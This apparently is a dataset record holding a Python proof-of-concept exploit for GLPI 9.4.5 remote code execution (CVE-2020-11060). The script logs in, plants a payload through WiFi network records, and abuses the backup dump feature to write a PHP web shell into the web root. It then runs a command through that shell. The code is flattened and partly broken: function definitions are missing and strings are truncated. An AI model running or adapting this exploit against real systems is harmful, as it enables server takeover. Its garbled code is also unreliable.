{
    "text": "vul_name : GLPI 9.4.5 Remote Code Execution ， vul_cve : CVE-2020-11060 ， vul_poc :  # Exploit Title : GLPI 9.4.5 - Remote Code Execution ( RCE )  ，  # Exploit Author : Brian Peters ，  # Vendor Homepage :  ，  # Software Link :  ，  # Version : < 9.4.6 ，  # CVE : CVE-2020-11060 ，  # Download a SQL dump and find the table offset for \"wifinetworks\" with ，  # cat <sqlfile> | grep \"CREATE TABLE\" | grep -n wifinetworks ，  # Update the offsettable value with this number in the create_dump function ，  # The Nix/Win paths are based on defaults. You can use curl -I <url> and use md5sum to find the path based ，  # on the Set-Cookie hash. ，  #  ! /usr/bin/python ， from datetime import datetime ， from lxml import html ， self.url = url ， self.user = user ， self.password = password ， self.platform = platform ， self.session = requests.Session (  )  ， self.session.verify = False ， requests.packages.urllib3.disable_warnings (  )  ， r = self.session.get ( '{0}'.format ( self.url )  , allow_redirects=True )  ， csrf_token = self.extract_csrf ( r.text )  ， name_field = re.findall ( 'name=\" ( . *  ) \" id=\"login_name\"' , r.text )  [ 0 ]  ， pass_field = re.findall ( 'name=\" ( . *  ) \" id=\"login_password\"' , r.text )  [ 0 ]  ， name_field , pass_field , csrf_token = self.get_login_data (  )  ， print \" [ - ] Login error : could not retrieve form data\" ， sys.exit ( 1 )  ， data = { ， name_field : self.user ,  ， pass_field : self.password ,  ， \"auth\" : \"local\" ,  ， \"submit\" : \"Post\" ,  ， \"_glpi_csrf_token\" : csrf_token ， } ， r = self.session.post ( '{}/front/login.php'.format ( self.url )  , data=data , allow_redirects=False )  ， r = self.session.get ( ' ， comment = r.content ， r = self.session.get ( '{0}/front/wifinetwork.php # modal_massaction_contentb5e83b3aa28f203595c34c5dbcea85c9'.format ( self.url )  ， csrf_token = self.extract_csrf ( r.text )  ， print \" [ - ] Edit network error : could not retrieve form data\" ， sys.exit ( 1 )  ， webpage = html.fromstring ( r.content )  ， links = webpage.xpath ( '/a/ @ href' )  ， rawlinkparts = rawlink.split ( \"=\" )  ， networkid = rawlinkparts [ -1 ]  ， print \"Deleting network \"+networkid ， data = { ， \"entities_id\" : \"0\" ,  ， \"is_recursive\" : \"0\" ,  ， \"name\" : \"PoC\" ,  ， \"comment\" : comment ,  ， \"essid\" : \"RCE\"+padding ,  ， \"mode\" : \"ad-hoc\" ,  ， \"purge\" : \"Delete permanently\" ,  ， \"id\" : networkid ,  ， \"_glpi_csrf_token\" : csrf_token ,  ， '_read_date_mod' : datemod ， } ， r = self.session.post ( '{}/front/wifinetwork.form.php'.format ( self.url )  , data=data )  ， r = self.session.get ( ' ， comment = r.content ， r = self.session.get ( '{0}/front/wifinetwork.php'.format ( self.url )  ， csrf_token = self.extract_csrf ( r.text )  ， print \" [ - ] Create network error : could not retrieve form data\" ， sys.exit ( 1 )  ， data = { ， \"entities_id\" : \"0\" ,  ， \"is_recursive\" : \"0\" ,  ， \"name\" : \"PoC\" ,  ， \"comment\" : comment ,  ， \"essid\" : \"RCE\" ,  ， \"mode\" : \"ad-hoc\" ,  ， \"add\" : \"ADD\" ,  ， \"_glpi_csrf_token\" : csrf_token ,  ， '_read_date_mod' : datemod ， } ， r = self.session.post ( '{}/front/wifinetwork.form.php'.format ( self.url )  , data=data )  ， print \" [ + ] Network created\" ， print \" Name : PoC\" ， print \" ESSID : RCE\" ， r = self.session.get ( ' ， comment = r.content ，  # create the padding for the name and essid ， r = self.session.get ( '{0}/front/wifinetwork.php'.format ( self.url )  ， webpage = html.fromstring ( r.content )  ， links = webpage.xpath ( '/a/ @ href' )  ， rawlinkparts = rawlink.split ( '/' )  ， link = rawlinkparts [ -1 ]  ，  # edit the network name and essid ， r = self.session.get ( '{0}/front/{1}'.format ( self.url , link )  ， csrf_token = self.extract_csrf ( r.text )  ， print \" [ - ] Edit network error : could not retrieve form data\" ， sys.exit ( 1 )  ， rawlinkparts = rawlink.split ( \"=\" )  ， networkid = rawlinkparts [ -1 ]  ， data = { ， \"entities_id\" : \"0\" ,  ， \"is_recursive\" : \"0\" ,  ， \"name\" : \"PoC\" ,  ， \"comment\" : comment ,  ， \"essid\" : \"RCE\"+padding ,  ， \"mode\" : \"ad-hoc\" ,  ， \"update\" : \"Save\" ,  ， \"id\" : networkid ,  ， \"_glpi_csrf_token\" : csrf_token ,  ， \"_read_date_mod\" : datemod ， } ， r = self.session.post ( '{0}/front/wifinetwork.form.php'.format ( self.url )  , data=data )  ， print \" [ + ] Network mofified\" ， print \" New ESSID : RCE\"+padding ， path=' ， path=\"C : \\xampp\\htdocs\\pics\\\" ， elif self.platform = \"Nix\" :  ， path=\"/var/www/html/glpi/pics/\" ，  # adjust offset number to match the table number for wifi_networks ，  # this can be found by downloading a SQL dump and running cat <dumpname> | grep \"CREATE TABLE\" | grep -n \"wifinetworks\" ， r = self.session.get ( '{0}/front/backup.php?dump=dump&offsettable=312&fichier={1}{2}'.format ( self.url , path , shellname )  ， print ' [ + ] Shell : {0}/pics/{1}'.format ( self.url , shellname )  ， r = self.session.get ( '{0}/pics/{1}?0=echo%20asdfasdfasdf'.format ( self.url , shellname )  ， print \" Shell size : \"+str ( len ( r.content )  ， print \" [ + ] RCE FOUND ! \" ， sys.exit ( 1 )  ， print \" [ - ] Login error\" ， print \" [ + ] Logged in\" ，  # create timestamp ， now = datetime.now (  )  ， datemod = now.strftime ( \"%Y-%m-%d %H : %M : %S\" )  ，  # create comment payload ， tick=1 ，  # create random shell name ， letters = string.ascii_letters ， shellname = '.join ( random.choice ( letters ) for i in range ( 8 ) +\".php\" ，  # create padding for ESSID ， padding = ' ， padding+=str ( i )  ， self.wipe_networks ( padding , datemod )  ， self.create_network ( datemod )  ， self.edit_network ( padding , datemod )  ， self.create_dump ( shellname )  ， self.shell_check ( shellname )  ， print \"\\n\" ， raw_input ( \"Press any key to continue with the next iteration.\" )  ， tick+=1 ， parser = argparse.ArgumentParser (  )  ， parser.add_argument ( \"-url\" , help=\"Target URL\" , required=True )  ， parser.add_argument ( \"-user\" , help=\"Username\" , required=True )  ， parser.add_argument ( \"-password\" , help=\"Password\" , required=True )  ， parser.add_argument ( \"-platform\" , help=\"Win/Nix\" , required=True )  ， args = parser.parse_args (  )  ， g = GlpiBrowser ( args.url , user=args.user , password=args.password , platform=args.platform )  ， g.pwn (  ) ",
    "time": "2021.07.04"
}